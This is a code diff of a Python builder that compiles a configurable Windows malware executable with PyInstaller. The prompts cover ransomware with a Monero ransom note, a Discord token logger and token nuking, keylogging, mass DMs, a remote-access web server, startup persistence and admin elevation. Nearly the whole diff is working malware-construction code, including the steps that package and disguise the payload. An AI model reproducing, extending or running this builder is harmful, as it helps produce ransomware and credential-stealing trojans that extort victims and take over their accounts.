@@ -1,6 +1,7 @@
 from colorama import Style, Fore, Back
+from websocket import create_connection
 from tqdm import tqdm
-import subprocess, requests, random, base64, json, fade, time, math, sys, os
+import subprocess, websocket, requests, random, base64, json, fade, time, math, sys, ssl, os
 
 class Main:
     def __init__(self):
@@ -9,9 +10,6 @@ class Main:
         config = self.get_input()
         print(f'{Fore.CYAN}Compiling program...{Style.RESET_ALL}')
         self.compile(config)
-
-    def flush(self):
-        print(' '*70, end='\r')
 
     def banner(self):
         print(fade.greenblue("""
@@ -27,20 +25,22 @@ class Main:
 
     def get_answer(self, message):
         answers = ('n', 'y')
-        
+
+        answer = input(message)
 
         while True:
-            answer = input(message)
             
             if not answer:
                 print(self.color("Invalid answer!", 'red'), end="\r")
                 time.sleep(1)
+                answer = input(message)
                 continue
 
             target = answer[0].lower()
             if not target in answers:
                 print(self.color("Invalid answer!", 'red'), end="\r")
                 time.sleep(1)
+                answer = input(message)
                 continue
 
             return target == 'y'
@@ -56,7 +56,7 @@ class Main:
             "REBOOTS_ALLOWED": reboots_allowed,
             "MONERO_WALLET": wallet,
             "CRYPTO_AMOUNT": cost,
-            "WEBHOOK": f"""O0O000OOO00O0OOO0("{webhook}").decode()""" if not dynamic_webhook else 'requests.get(f"https://{self.ht}/webhook",data={"key":self.k}).text',
+            "WEBHOOK": "'webhook'" if not dynamic_webhook else 'requests.get(f"https://{self.ht}/webhook",data={"key":self.k}).text',
             "TOKEN_LOGGER": token_logger,
             "NUKE_TOKEN": auto_nuke,
             "MASSDM": massdm,
@@ -72,6 +72,7 @@ class Main:
                 "base": self.base,
                 "recursion": self.recursion,
                 "bytes": self.bytes,
+                "admin": admin,
             },
             "config": key,
             "hwid": self.hwid,
@@ -81,7 +82,6 @@ class Main:
 
         print(src)
 
-        open('src\\output.py', 'w+')
         with open('src\\output.py', 'wb') as file:
             file.write(src)
 
@@ -91,19 +91,39 @@ class Main:
         with open('src\\temp\\instructions.txt', 'w+') as file:
             file.write(data.replace('WALLET', wallet).replace('AMOUNT', str(cost)))
 
-        dir = os.path.dirname(os.path.realpath(__file__))
-
-        python = subprocess.check_output('where python').splitlines()[0]
-        packages = f"{python}\\lib\\site-packages"
-
-        print(dir)
-        command = ['pyinstaller', '--noconfirm', '--onefile', '--windowed', '--icon' if icon else '', icon if icon else '', '--uac-admin' if admin else '', '--upx-dir', 'build\\upx', '--workpath', 'build', '--specpath', 'build\\spec', '--add-data', f'{dir}\\src\\files\\annoy.mp3;.', '--add-data', f'{dir}\\src\\temp\\instructions.txt;.', '--add-data', f'{dir}\\src\\files\\wallpaper.jpg;.', f'--paths', packages, f'{dir}\\src\\output.py']
-        
+        command = ['pyinstaller', '--noconfirm', '--onefile', '--windowed', '--icon' if icon else '', icon if icon else '', '--uac-admin' if admin else '', '--upx-dir', 'build\\upx', '--workpath', 'build', '--specpath', 'build\\spec', '--add-data', f'{dir}\\src\\files\\annoy.mp3;.', '--add-data', f'{dir}\\src\\temp\\instructions.txt;.', '--add-data', f'{dir}\\src\\files\\wallpaper.jpg;.', f'{dir}\\src\\output.py']
         for _ in range(command.count('')):
             command.remove('')
         print(command)
 
-        subprocess.call(command,shell=True)
+        # if self.server_convert:
+        #     ws = create_connection('wss://septicx.repl.co/api/ws/build', sslopt={
+        #         "cert_reqs": ssl.CERT_NONE
+        #     }, headers={})
+        #     ws.send(self.key)
+        #     ws.send(self.hwid)
+        #     ws.send(json.dumps({
+        #         'code': src.decode(),
+        #         'config': {
+        #             'admin': admin,
+        #             'icon': base64.b64encode(open(icon, 'rb').read()).decode() if icon else '',
+        #             "wallpaper.jpg": base64.b64encode(open('src\\files\\annoy.mp3', 'rb').read()).decode(),
+        #             "instructions.txt": base64.b64encode(open('src\\temp\\instructions.txt', 'rb').read()).decode(),
+        #             "annoy.mp3": base64.b64encode(open('src\\files\\annoy.mp3', 'rb').read()).decode()
+        #         }
+        #     }))
+
+        #     prev = ''
+        #     while True:
+        #         line = ws.recv()
+        #         if not line:
+        #             code = prev
+        #         else:
+        #             print(line)
+            
+        #     with open('dist\\output.exe', 'wb') as file:
+        #         file.write(base64.b64decode(prev))
+        subprocess.call(command, shell=True)
         print(self.color('Your file is in the dist folder named "output.exe"'))
         os.system('PAUSE')
         
@@ -160,6 +180,8 @@ class Main:
                     print(color('Invalid Input!', 'red'), end='\r')
                     time.sleep(1)
 
+                break
+
             else:
                 print(color('(Premium required)', 'red'), end='\r')
                 time.sleep(1)
@@ -175,9 +197,19 @@ class Main:
                     time.sleep(1)
                     continue
 
-                self.bytes = self.get_answer(color("Use random byte characters (Y or N): ")+"> ")
-                if not self.bytes:
-                    self.base = 93
+                break
+            print(color("Use random byte characters (Y or N): "), end="> ")
+
+            while self.premium:
+                try:
+                    self.bytes = self.get_answer("")
+                    if not self.bytes:
+                        self.base = 93
+                except:
+                    print(color('Invalid Input!', 'red'), end='\r')
+                    time.sleep(1)
+                    print(color("Use random byte characters (Y or N): "), end="> ")
+                    continue
 
                 break
             else:
@@ -224,14 +256,7 @@ class Main:
             admin = config['RUN_WITH_ADMIN']
 
         else:
-            if self.premium:
-                rat_client = self.get_answer(color("Connect to webserver? (Y or N): ")+"> ")
-            else:
-                print(color("Connect to webserver? (Y or N): ")+"> ", end="")
-                print(color("(Premium required)", 'red'), end='\r')
-                rat_client = False
-                time.sleep(1)
-                self.flush()
+            rat_client = self.get_answer(color("Connect to webserver? (Y or N): ")+"> ")
 
             if rat_client:
                 print(color("Enter server address: "), end="")
@@ -245,7 +270,6 @@ class Main:
                 keylogger = self.get_answer(color("Enable Keylogging (Y or N): ")+"> ")
 
             if not dynamic_webhook:
-                print(color("Enter Discord webhook: ", 'blue'), end="")
                 webhook = base64.b64encode(input("> ").encode())
 
             ransomware = self.get_answer(color("Enable Ransomware (Y or N): ")+"> ")
@@ -285,6 +309,8 @@ class Main:
             icon = input("> ")
 
             admin = self.get_answer(color("Run as Administator? (Y or N): ")+"> ")
+
+        # self.server_convert = self.get_answer(color("Compile via CloudConvert? (Y or N): ")+"> ")
 
         return rat_client, server_addr, server_key, dynamic_webhook, webhook, ransomware, reboots_allowed, wallet, cost, keylogger, token_logger, massdm, massdm_script, auto_nuke, browser, startup, debug, icon, admin
             
